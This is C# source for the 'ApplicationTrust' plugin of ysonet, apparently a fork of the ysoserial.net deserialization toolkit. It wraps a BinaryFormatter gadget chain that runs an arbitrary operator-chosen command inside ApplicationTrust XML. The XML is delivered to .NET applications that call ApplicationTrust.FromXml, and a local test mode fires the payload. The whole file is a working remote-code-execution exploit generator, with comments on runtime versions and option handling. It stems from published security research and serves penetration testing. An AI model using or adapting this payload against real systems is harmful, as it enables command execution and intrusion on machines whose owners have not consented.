using NDesk.Options;
using System;
using System.Collections.Generic;
using ysonet.Generators;
using ysonet.Helpers;

/**
 * Author: Soroush Dalili (@irsdl)
 * 
 * Comments: 
 *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
 *  See `ApplicationTrust.FromXml(SecurityElement) Method`: https://docs.microsoft.com/en-us/dotnet/api/system.security.policy.applicationtrust.fromxml
 *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
 *  This PoC wraps a BinaryFormatter payload; the gadget is chosen with -g and
 *  defaults to TextFormattingRunProperties
 *  This PoC produces an error and may crash the application
 *
 *  ApplicationTrust.FromXml is a .NET 2.0 API, so the carrier reaches a CLR-v2
 *  target. Whether the PAYLOAD does is the chosen gadget's property, which is why
 *  -g exists here: the default needs an assembly a CLR-v2 target does not have.
 **/

namespace ysonet.Plugins
{
    public class ApplicationTrustPlugin : IPlugin
    {
        // The gadget this plugin wrapped before -g existed. Kept as the default so no
        // existing command line changes what it produces.
        const string DefaultGadget = "TextFormattingRunProperties";

        static string command = "";
        static string gadget = DefaultGadget;
        static bool test = false;
        static bool minify = false;
        static bool useSimpleType = true;
        static bool rawcmd = false;
        static bool noComment = false;
        static bool dosAcknowledged = false;
        static bool legacyFx = false;

        static OptionSet options = new OptionSet()
            {
                {"c|command=", "the command to be executed", v => command = v },
                {"g|gadget=", "a gadget chain that supports BinaryFormatter. Default: " + DefaultGadget + ".", v => gadget = v },
                {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
                {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
                {"legacyfx", "Target the .NET Framework 2.0/3.0/3.5 (CLR v2) generation. This reaches the GADGET only; this plugin's own XML envelope names no framework assembly, so it needs no rewriting. Default: false", v => legacyFx = v != null },
                {"no-comment", "Output only the serialized payload, without the explanatory XML comment.", v => noComment = v != null },
                {Helpers.Core.DosPolicy.AckOptionName, Helpers.Core.DosPolicy.AckHelp, v => dosAcknowledged = v != null },
            };

        public string Name()
        {
            return "ApplicationTrust";
        }

        public string Description()
        {
            return "Generates XML payload for the ApplicationTrust class";
        }

        public string Credit()
        {
            return "Soroush Dalili";
        }

        // A public plugin: it is listed everywhere, with or without --display-private.
        public bool IsPrivate() { return false; }

        // Measured at BOTH ends: the LEGACY tier fires this plugin on real CLR-v2 children
        // (2.0/3.0/3.5 lanes, raw and minified), and the execution matrix observes it on
        // this machine's 4.8.1 build.
        //
        // Declared as a CONTIGUOUS range rather than just those endpoints, and that is a
        // correctness point rather than a style one. A HOLE inside a declared span is not
        // "unmeasured", it is an active EXCLUSION: ClassifyVersionEvidence returns
        // Contradiction for an observation inside the hole, and its own unit test spells
        // that out ("the gadget positively says it does not work there"). So declaring
        // {2.0,3.0,3.5,4.8.1} would FAIL the suite on any 4.0-4.8 machine the moment the
        // execution matrix fired this plugin there - a red build for a contributor whose
        // box is 4.8 rather than 4.8.1, reporting a claim that was never intended.
        //
        // ObjRef and TempFileCollection carry the identical evidence shape (CLR-v2 lanes
        // plus 4.8.1) and both declare Range(NetFx20, NetFx481) for the same reason.
        public List<string> RuntimeVersions()
        {
            return new List<string>(RuntimeVersion.Range(
                RuntimeVersion.NetFx20, RuntimeVersion.NetFx481));
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            InputArgs inputArgs = new InputArgs();
            List<string> extra;
            // Reset EVERY option so an in-process prior run cannot leak into this one.
            // A partial reset is worse than none: -g in particular would stick, and the
            // next caller would silently get the previous run's gadget.
            command = "";
            gadget = DefaultGadget;
            test = false;
            minify = false;
            useSimpleType = true;
            rawcmd = false;
            noComment = false;
            dosAcknowledged = false;
            legacyFx = false;
            try
            {
                extra = options.Parse(args);
                inputArgs.Cmd = command;
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
                inputArgs.IsRawCmd = rawcmd;
                inputArgs.DosAcknowledged = dosAcknowledged;
                // Reaches the inner gadget's generation boundary only. This plugin's own
                // XML template names no framework assembly, so there is nothing here for
                // the transform to rewrite.
                inputArgs.LegacyFx = legacyFx;
                // NOT inputArgs.Test. -t on this plugin means "run the ApplicationTrust
                // PoC below", and the payload must be built without firing itself first.
                inputArgs.Test = false;
                // Anything this plugin did not recognise belongs to the gadget the user
                // chose with -g, so it is forwarded rather than dropped. Without this a
                // gadget option typed on a plugin command line (--var, for example) goes
                // nowhere and the operator silently gets the default variant. Only the
                // LEFTOVER args travel: an option this plugin declares was already
                // consumed by the parse above, so the two cannot collide.
                inputArgs.ExtraArguments = extra;
            }
            catch (OptionException e)
            {
                Console.Write("ysonet: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception(e.Message);
            }
            String payloadValue = "";
            // The commented-out <DefaultGrant> block is an optional example the operator
            // can enable; --no-comment drops it and leaves just the ApplicationTrust XML.
            string commentBlock = noComment ? "" :
@"<!--  the following commented tags can be enabled when needed-->
<!--
<DefaultGrant>
<PolicyStatement version=""1"">
<PermissionSet class=""System.Security.PermissionSet"" version=""1""/>
</PolicyStatement>
</DefaultGrant>
-->
";
            string payload = @"<ApplicationTrust version=""1"" TrustedToRun=""true"">
<ExtraInfo Data=""{0}"">
</ExtraInfo>
" + commentBlock + @"</ApplicationTrust>
";
            if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
            {
                Console.Write("ysonet: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception("Incorrect plugin mode/arguments combination");
            }

            // A user-selectable gadget goes through the shared resolver, so the name
            // rules, the denial-of-service gate and the error text match every other
            // plugin that takes -g.
            Helpers.Core.RunResult gadgetResult =
                Helpers.Core.PayloadRunner.GeneratePluginGadget(gadget, "BinaryFormatter", inputArgs);
            if (!gadgetResult.Success)
            {
                Console.WriteLine(gadgetResult.ErrorMessage);
                throw new Exception(gadgetResult.ErrorMessage);
            }
            foreach (string warning in gadgetResult.Warnings)
                Console.Error.WriteLine(warning);

            byte[] osf = (byte[])gadgetResult.Raw;
            payloadValue = BitConverter.ToString(osf).Replace("-", string.Empty);
            payload = String.Format(payload, payloadValue);

            if (minify)
            {
                payload = XmlMinifier.Minify(payload, null, null);
            }

            if (test)
            {
                // PoC on how it works in practice
                try
                {
                    System.Security.SecurityElement malPayload = System.Security.SecurityElement.FromString(payload);
                    System.Security.Policy.ApplicationTrust myApplicationTrust = new System.Security.Policy.ApplicationTrust();
                    myApplicationTrust.FromXml(malPayload);
                    Console.WriteLine(myApplicationTrust.ExtraInfo);
                }
                catch (Exception err)
                {
                    Debugging.ShowErrors(inputArgs, err);
                }
            }

            return payload;
        }
    }
}
